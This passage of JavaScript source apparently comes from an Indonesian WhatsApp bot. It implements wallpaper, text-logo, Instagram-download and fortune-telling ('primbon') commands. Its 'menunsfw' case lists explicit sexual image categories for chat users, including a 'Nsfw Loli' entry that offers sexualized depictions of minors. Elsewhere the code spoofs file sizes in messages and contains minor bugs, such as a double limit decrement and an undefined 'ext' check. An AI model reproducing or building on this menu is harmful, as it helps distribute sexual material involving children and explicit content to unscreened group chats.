   alfa.sendMessage(m.chat, { video: { url: jsnya.nowm }, caption: `Title: ${jsnya.title}`}, { quoted: m})
   }
  break
case 'menunsfw': {
let sections = [
				{
				title: "MENU NSFW 🔞",
				rows: [
				{title: "Ahegao", rowId: 'ahegao'},
				{title: "Trap", rowId: 'trap'},
				{title: "Blowjob", rowId: 'blowjob'},
				{title: "Yuri", rowId: 'yuri'},
				{title: "Bdsm", rowId: 'bdsm'},
				{title: "Neko", rowId: 'neko'},
				{title: "Neko2", rowId: 'neko2'},
				{title: "Ass", rowId: 'ass'},
				{title: "Nsfw Loli", rowId: 'nsfwloli'},
				{title: "Ero", rowId: 'ero'},
				{title: "Cuckold", rowId: 'cuckold'},
				{title: "Cum", rowId: 'cum'},
				{title: "Zettai", rowId: 'zettai'},
				{title: "Foot", rowId: 'foot'},
			   {title: "Femdom", rowId: 'Femdom'}, 
				{title: "Glasses", rowId: 'glasses'},
				{title: "Panties", rowId: 'panties'},
				{title: "Orgy", rowId: 'orgy'},
				{title: "Manga", rowId: 'manga'},
				{title: "Gang Bang", rowId: 'gangbang'},
				{title: "Jahy", rowId: 'jahy'},
				{title: "Tentacles", rowId: 'tentacles'},
				{title: "Thighs", rowId: 'thighs'},
				{title: "Pussy", rowId: 'pussy'},
				]},
				{
				title: "PERANCANG BOT",
				rows: [
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
				},
				]
				alfa.sendListMsg(m.chat, `List Menu Nsfw Nya Ada Di Bawah Ya 🌚`, global.copy, `Haii Kk ${pushname}`, `Menu Nsfw 🎀`, sections, m)
			}
			break
case 'waifu': 
case 'waifu2': 
case 'loli': 
case 'yotsuba': 
case 'minato': 
case 'kurumi': 
case 'sagiri': 
case 'megumin': 
case 'miku': 
case 'onepiece': 
case 'shinomiya': 
case 'yumeko': 
case 'tejina': 
case 'boruto': 
case 'kotori': 
case 'eren': 
case 'kaori': 
case 'shizuka': 
case 'tsunade': 
case 'chiho': 
case 'kaga': 
case 'akiyama': 
case 'gremory': 
case 'isuzu': 
case 'shina': 
case 'kagura': 
case 'shinka': 
case 'eba': 
case 'elaina': 
case 'yuri': 
case 'erza': 
case 'hinata': 
case 'naruto': 
case 'nezuko': 
case 'rize': 
case 'anna': 
case 'deidara': 
case 'yuki': 
case 'asuna': 
case 'ayuzawa': 
case 'chitoge': 
case 'emilia': 
case 'hestia': 
case 'inori': 
case 'itachi': 
case 'madara': 
case 'sakura': 
case 'sasuke': 
case 'tsunade': 
case 'keneki': 
case 'toukachan': 
case 'akira': 
case 'itori': 
case 'pokemon': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
							
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: { url: `https://revita.herokuapp.com/api/wallpaper/${command}?apikey=${rev}` },
					caption: `Nih Om 々`,
					fileLength: "100000000000000000",
					footer: global.ownmy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
			break
		case 'couple': {
		if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
				fakey(wet)
				let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
				let random = anu[Math.floor(Math.random() * anu.length)]
				alfa.sendMessage(m.chat, { image: { url: random.male }, caption: `*COUPLE COWO*` }, { quoted: m })
				alfa.sendMessage(m.chat, { image: { url: random.female }, caption: `*COUPLE CEWE*` }, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
		break
			case 'coffe': case 'kopi': {
			let buttons = [
					{buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
				]
				let buttonMessage = {
					image: { url: 'https://coffee.alexflipnote.dev/random' },
					caption: `☕ Random Coffe`,
					footer: alfa.user.name,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
			}
			break
			case 'wallpaper': {
			if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
				if (!text) throw '*「TITLE NYA MANA ?」*'
		let { wallpaper } = require('./lib/scraper')
				anu = await wallpaper(text)
				result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
					{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
				]
				let buttonMessage = {
					image: { url: result.image[0] },
					caption: `➤ Title : ${result.title}\n➤ Category : ${result.type}\n➤ Detail : ${result.source}\n➤ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
					footer: alfa.user.name,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
			break
			case 'wikimedia': {
				if (!text) throw '*「TITLE NYA MANA ?」*'
		let { wikimedia } = require('./lib/scraper')
				anu = await wikimedia(text)
				result = anu[Math.floor(Math.random() * anu.length)]
				let buttons = [
					{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
				]
				let buttonMessage = {
					image: { url: result.image },
					caption: `➤ Title : ${result.title}\n➤ Source : ${result.source}\n➤ Media Url : ${result.image}`,
					footer: alfa.user.name,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
			}
			break
			case 'hajga': case 'javsua': {
			
		let { quotesAnime } = require('./lib/scraper')
				let anu = await quotesAnime()
				result = anu[Math.floor(Math.random() * anu.length)]
				let buttons = [
					{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
				]
				let buttonMessage = {
					text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
					footer: 'Press The Button Below',
					buttons: buttons,
					headerType: 2
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
			}
			break
			case 'blackpink': 
case 'neon': 
case 'greenneon': 
case 'futureneon': 
case 'sandwriting': 
case 'sandsummer': 
case 'sandengraved': 
case 'metaldark': 
case 'neonlight': 
case 'holographic': 
case 'text1917': 
case 'minion': 
case 'deluxesilver': 
case 'newyearcard': 
case 'bloodfrosted': 
case 'halloween': 
case 'jokerlogo': 
case 'fireworksparkle': 
case 'natureleaves': 
case 'bokeh': 
case 'toxic': 
case 'strawberry': 
case 'box3d': 
case 'roadwarning': 
case 'breakwall': 
case 'icecold': 
case 'luxury': 
case 'cloud': 
case 'summersand': 
case 'hororblod': 
case 'thunder': 
case 'magma': 
case 'impressiveglitch': 
case 'harrypotter': 
case 'foggywindow': 
case 'watercolor': 
case 'wonderfulgraffiti': 
case 'pornhub': 
case 'glitch': 
case 'avanger': 
case 'space': 
case 'ninjalogo': 
case 'marvelstudio': 
case 'lionlogo': 
case 'wolflogo': 
case 'wallgravity': 
case 'coolgravity': {
			
				if (!text) throw 'Text Nya ?'
				let buttons = [
					{buttonId: 'sc', buttonText: {displayText: 'Script'}, type: 1},
				]
				fakey(wet)
				let asu = {
					image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${text}` },
					caption: `Nih Om 々`,
					footer: global.ownmy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, asu, { quoted: m })
			}
	   break
case 'steel3d': {
if (!text) throw 'Text Nya ?'
				let buttons = [
					{buttonId: 'sc', buttonText: {displayText: 'Script'}, type: 1},
				]
				fakey(wet)
				let asu = {
					image: { url: `https://api.lolhuman.xyz/api/textprome2/steel3d?apikey=${lolkey}&text1=${text}&text2=${text}` },
					caption: `Nih Om 々`,
					footer: global.ownmy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, asu, { quoted: m })
			}
	   break
case 'wetglass':
case 'multicolor3d':
case 'luxurygold':
case 'galaxywallpaper':
case 'lighttext':
case 'beautifulflower':
case 'puppycute':
case 'royaltext':
case 'heartshaped':
case 'brithdaycake':
case 'galaxystyle':
case 'hologram3d':
case 'greenneon':
case 'glossychrome':
case 'greenbush':
case 'metallogo':
case 'noeltext':
case 'glittergold':
case 'textcake':
case 'starsnight':
case 'wooden3d':
case 'textbyname':
case 'writegalaxy':
case 'galaxybat':
case 'snow3d':
case 'brithdayday':
case 'goldplaybutton':
case 'silverplaybutton':
case 'freefire':
case 'cartoongravity':
case 'anonymhacker':
case 'mlwallpaper':
case 'pubgmaskot':
case 'aovwallpaper':
case 'logogaming':
case 'fpslogo':
case 'avatarlolnew':
case 'lolbanner':
case 'avatardota':
case 'juventusshirt':
case 'cutegravity':
case 'realvintage':
case 'codwarzone':
case 'valorantbanner': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw 'Text Nya ?'
				let buttons = [
					{buttonId: 'sc', buttonText: {displayText: 'Script'}, type: 1},
				]
				fakey(wet)
				let asu = {
					image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${text}` },
					caption: `Nih Om 々`,
					footer: global.ownmy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, asu, { quoted: m })
			}
	   break
		case 'shadow':
case 'cup':
case 'cup2':
case 'smoke':
case 'romance':
case 'burnpaper':
case 'lovemessage':
case 'undergrass':
case 'love':
case 'coffe':
case 'woodheart':
case 'woodenboard':
case 'summer3d':
case 'wolfmetal':
case 'nature3d':
case 'underwater':
case 'goldenrose':
case 'summernature':
case 'fallleaves':
case 'flamming':
case 'harrypoter':
case 'carvedwood':
case 'arcade8bit':
case 'battlefield4':
case 'pubg':
case 'bannerlol': {
		if (!m.isGroup) throw man.gcwa
				if (!text) throw 'Text Nya ?'
let buttons = [
					{buttonId: 'sc', buttonText: {displayText: 'Script'}, type: 1},
				]
				fakey(wet)
				let asu = {
					image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${text}` },
					caption: `Nih Om 々`,
					footer: global.ownmy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, asu, { quoted: m })
			}
	   break
		case 'nomerhoki': case 'nomorhoki': {
				if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
				let anu = await primbon.nomer_hoki(Number(text))
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nomor HP :* ${anu.message.nomer_hp}\n➤ *Angka Shuzi :* ${anu.message.angka_shuzi}\n➤ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n➤ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
			}
			break
			case 'artimimpi': case 'tafsirmimpi': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} belanja`
				let anu = await primbon.tafsir_mimpi(text)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Mimpi :* ${anu.message.mimpi}\n➤ *Arti :* ${anu.message.arti}\n➤ *Solusi :* ${anu.message.solusi}`, m)
			}
			break
			case 'ramalanjodoh': case 'ramaljodoh': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
				let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
				let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama Anda :* ${anu.message.nama_anda.nama}\n➤ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➤ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➤ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'ramalanjodohbali': case 'ramaljodohbali': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
				let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
				let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama Anda :* ${anu.message.nama_anda.nama}\n➤ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➤ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➤ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'suamiistri': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
				let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
				let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama Suami :* ${anu.message.suami.nama}\n➤ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n➤ *Nama Istri :* ${anu.message.istri.nama}\n➤ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'ramalancinta': case 'ramalcinta': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
				let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
				let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama Anda :* ${anu.message.nama_anda.nama}\n➤ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➤ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➤ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➤ *Sisi Positif :* ${anu.message.sisi_positif}\n➤ *Sisi Negatif :* ${anu.message.sisi_negatif}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'artinama': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika Ardianta`
				let anu = await primbon.arti_nama(text)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Arti :* ${anu.message.arti}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'kecocokannama': case 'cocoknama': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
				let [nama, tgl, bln, thn] = text.split`,`
				let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Life Path :* ${anu.message.life_path}\n➤ *Destiny :* ${anu.message.destiny}\n➤ *Destiny Desire :* ${anu.message.destiny_desire}\n➤ *Personality :* ${anu.message.personality}\n➤ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
			}
			break
			case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} Dika|Novia`
				let [nama1, nama2] = text.split`|`
				let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendImage(m.chat,  anu.message.gambar, `➤ *Nama Anda :* ${anu.message.nama_anda}\n➤ *Nama Pasangan :* ${anu.message.nama_pasangan}\n➤ *Sisi Positif :* ${anu.message.sisi_positif}\n➤ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
			}
			break
			case 'jadianpernikahan': case 'jadiannikah': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Tanggal Pernikahan :* ${anu.message.tanggal}\n➤ *karakteristik :* ${anu.message.karakteristik}`, m)
			}
			break
			case 'sifatusaha': {
			if (!m.isGroup) throw man.gcwa
				if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Lahir :* ${anu.message.hari_lahir}\n➤ *Usaha :* ${anu.message.usaha}`, m)
			}
			break
			case 'rejeki': case 'rezeki': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Lahir :* ${anu.message.hari_lahir}\n➤ *Rezeki :* ${anu.message.rejeki}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'pekerjaan': case 'kerja': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Lahir :* ${anu.message.hari_lahir}\n➤ *Pekerjaan :* ${anu.message.pekerjaan}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'ramalannasib': case 'ramalnasib': case 'nasib': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw `Example : 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.ramalan_nasib(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Analisa :* ${anu.message.analisa}\n➤ *Angka Akar :* ${anu.message.angka_akar}\n➤ *Sifat :* ${anu.message.sifat}\n➤ *Elemen :* ${anu.message.elemen}\n➤ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
			}
			break
			case 'potensipenyakit': case 'penyakit': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Analisa :* ${anu.message.analisa}\n➤ *Sektor :* ${anu.message.sektor}\n➤ *Elemen :* ${anu.message.elemen}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'artitarot': case 'tarot': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendImage(m.chat, anu.message.image, `➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Simbol Tarot :* ${anu.message.simbol_tarot}\n➤ *Arti :* ${anu.message.arti}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'fengshui': {
				if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
				let [nama, gender, tahun] = text.split`,`
				let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Lahir :* ${anu.message.tahun_lahir}\n➤ *Gender :* ${anu.message.jenis_kelamin}\n➤ *Angka Kua :* ${anu.message.angka_kua}\n➤ *Kelompok :* ${anu.message.kelompok}\n➤ *Karakter :* ${anu.message.karakter}\n➤ *Sektor Baik :* ${anu.message.sektor_baik}\n➤ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
			}
			break
			case 'haribaik': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.petung_hari_baik(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Kala Tinantang :* ${anu.message.kala_tinantang}\n➤ *Info :* ${anu.message.info}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'harisangar': case 'taliwangke': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Hasil :* ${anu.message.result}\n➤ *Info :* ${anu.message.info}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'harinaas': case 'harisial': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Hari Lahir :* ${anu.message.hari_lahir}\n➤ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➤ *Hari Naas :* ${anu.message.hari_naas}\n➤ *Info :* ${anu.message.catatan}\n➤ *Catatan :* ${anu.message.info}`, m)
			}
			break
			case 'nagahari': case 'harinaga': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Hari Lahir :* ${anu.message.hari_lahir}\n➤ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➤ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'arahrejeki': case 'arahrezeki': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Hari Lahir :* ${anu.message.hari_lahir}\n➤ *tanggal Lahir :* ${anu.message.tgl_lahir}\n➤ *Arah Rezeki :* ${anu.message.arah_rejeki}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'peruntungan': {
				if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
				let [nama, tgl, bln, thn, untuk] = text.split`,`
				let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'weton': case 'wetonjawa': {
				if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.weton_jawa(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Tanggal :* ${anu.message.tanggal}\n➤ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n➤ *Watak Hari :* ${anu.message.watak_hari}\n➤ *Naga Hari :* ${anu.message.naga_hari}\n➤ *Jam Baik :* ${anu.message.jam_baik}\n➤ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
			}
			break
			case 'sifat': case 'karakter': {
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
				let [nama, tgl, bln, thn] = text.split`,`
				let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
			}
			break
			case 'keberuntungan': {
				if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
				let [nama, tgl, bln, thn] = text.split`,`
				let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Nama :* ${anu.message.nama}\n➤ *Lahir :* ${anu.message.tgl_lahir}\n➤ *Hasil :* ${anu.message.result}`, m)
			}
			break
			case 'memancing': {
				if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
				let [tgl, bln, thn] = text.split`,`
				let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Tanggal :* ${anu.message.tgl_memancing}\n➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'masasubur': {
				if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
				let [tgl, bln, thn, siklus] = text.split`,`
				let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Hasil :* ${anu.message.result}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'zodiak': case 'zodiac': {
				if (!text) throw `Example : ${prefix+ command} 7 7 2005`
				let zodiak = [
					["capricorn", new Date(1970, 0, 1)],
					["aquarius", new Date(1970, 0, 20)],
					["pisces", new Date(1970, 1, 19)],
					["aries", new Date(1970, 2, 21)],
					["taurus", new Date(1970, 3, 21)],
					["gemini", new Date(1970, 4, 21)],
					["cancer", new Date(1970, 5, 22)],
					["leo", new Date(1970, 6, 23)],
					["virgo", new Date(1970, 7, 23)],
					["libra", new Date(1970, 8, 23)],
					["scorpio", new Date(1970, 9, 23)],
					["sagittarius", new Date(1970, 10, 22)],
					["capricorn", new Date(1970, 11, 22)]
				].reverse()

				function getZodiac(month, day) {
					let d = new Date(1970, month - 1, day)
					return zodiak.find(([_,_d]) => d >= _d)[0]
				}
				let date = new Date(text)
				if (date == 'Invalid Date') throw date
				let d = new Date()
				let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
				let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

				let zodiac = await getZodiac(birth[1], birth[2])
				
				let anu = await primbon.zodiak(zodiac)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Zodiak :* ${anu.message.zodiak}\n➤ *Nomor :* ${anu.message.nomor_keberuntungan}\n➤ *Aroma :* ${anu.message.aroma_keberuntungan}\n➤ *Planet :* ${anu.message.planet_yang_mengitari}\n➤ *Bunga :* ${anu.message.bunga_keberuntungan}\n➤ *Warna :* ${anu.message.warna_keberuntungan}\n➤ *Batu :* ${anu.message.batu_keberuntungan}\n➤ *Elemen :* ${anu.message.elemen_keberuntungan}\n➤ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n➤ *Catatan :* ${anu.message.catatan}`, m)
			}
			break
			case 'shio': {
				if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
				let anu = await primbon.shio(text)
				if (anu.status == false) return m.reply(anu.message)
				alfa.sendText(m.chat, `➤ *Hasil :* ${anu.message}`, m)
			}
			break
			case 'instagram': case 'ig': case 'igdl': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw 'No Query Url!'
				fakey(wet)
				if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
					let anu = await fetchJson(api('lol', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
					for (let media of anu.data) alfa.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
				} else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
					let anu = await fetchJson(api('lol', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
